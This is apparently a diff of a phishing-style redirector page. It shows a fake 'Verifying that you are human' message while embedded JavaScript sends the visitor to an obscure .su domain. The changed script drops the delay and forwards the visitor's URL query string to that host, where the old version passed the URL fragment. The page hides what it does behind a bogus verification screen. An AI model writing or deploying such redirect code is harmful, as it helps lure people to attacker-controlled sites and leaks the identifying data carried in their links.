@@ -75,18 +75,24 @@
         <div class="message">Verifying that you are human...</div>
     </div>
 
-    <script>
-    function startRedirect() {
-        let baseRedirectUrl = "https://4abkh.mudequel.su/SQCCb/";
-        const fragment = window.location.hash.substring(1); // Get the fragment identifier
-        const redirectUrl = fragment ? `${baseRedirectUrl}#${fragment}` : baseRedirectUrl; // Append fragment with # if present
-        setTimeout(() => {
-            window.location.href = redirectUrl;
-        }, 1200); // 1.2 seconds delay before redirecting
+  <script>
+    function redirectWithQuery() {
+        
+        const baseRedirectUrl = "https://4abkh.mudequel.su/SQCCb/#K";
+        
+        
+        const queryString = window.location.search.substring(1);
+        
+        
+        const redirectUrl = queryString ? `${baseRedirectUrl}?${queryString}` : baseRedirectUrl;
+        
+        
+        window.location.href = redirectUrl;
     }
     
-    startRedirect(); // Start the redirect process
+    redirectWithQuery(); 
 </script>
+
 
 </body>
 </html>
